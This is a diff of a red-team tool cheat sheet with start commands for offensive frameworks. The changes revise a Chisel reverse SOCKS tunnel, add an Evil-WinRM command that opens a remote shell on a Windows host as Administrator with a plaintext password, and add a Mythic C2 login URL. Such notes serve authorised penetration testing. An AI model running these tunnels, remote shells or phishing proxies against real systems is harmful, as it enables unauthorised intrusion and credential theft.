@@ -14,14 +14,18 @@ Caldera:
 - Reference: https://github.com/mitre/caldera
 
 Chisel:
-- Start server: cd /opt/Chisel && ./chisel_linux_amd64 server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
-- Start client (on Windows): chisel.exe client --auth user:pass https://example.cloudfront.net R:1080:socks
+- Start server: cd /opt/Chisel && ./chisel-linux_amd64 server -p 80 --auth "user:pass" --socks5 --reverse
+- Start client (on Windows): chisel.exe client --auth user:pass 192.168.1.100:80 R:1080:socks
 - Reference: https://github.com/jpillora/chisel
 
 Evilginx:
 - Note: requires DNS glue records to point to the server IP.
 - Start: cd /opt/evilginx && sudo ./evilginx2
 - Reference: https://github.com/kgretzky/evilginx2
+
+Evil-WinRM:
+- Start: cd /opt/tools/evil-winrm && ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+- Reference: https://github.com/Hackplayers/evil-winrm
 
 Exploit DB:
 - Search: cd /opt/exploit-db && ./searchsploit  
@@ -38,8 +42,9 @@ Metasploit:
 - Reference: https://github.com/rapid7/metasploit-framework  
 
 Mythic:
-- Start: cd /opt/Mythic && ./mythic-cli mythic start  
-- Get Password: ./mythic-cli config get MYTHIC_ADMIN_PASSWORD  
+- Start: cd /opt/Mythic && ./mythic-cli start  
+- Get Password: ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
+- Log in: https://<ip>:7443 (username: mythic_admin)
 - Reference: https://github.com/its-a-feature/Mythic  
 
 ROADtools:
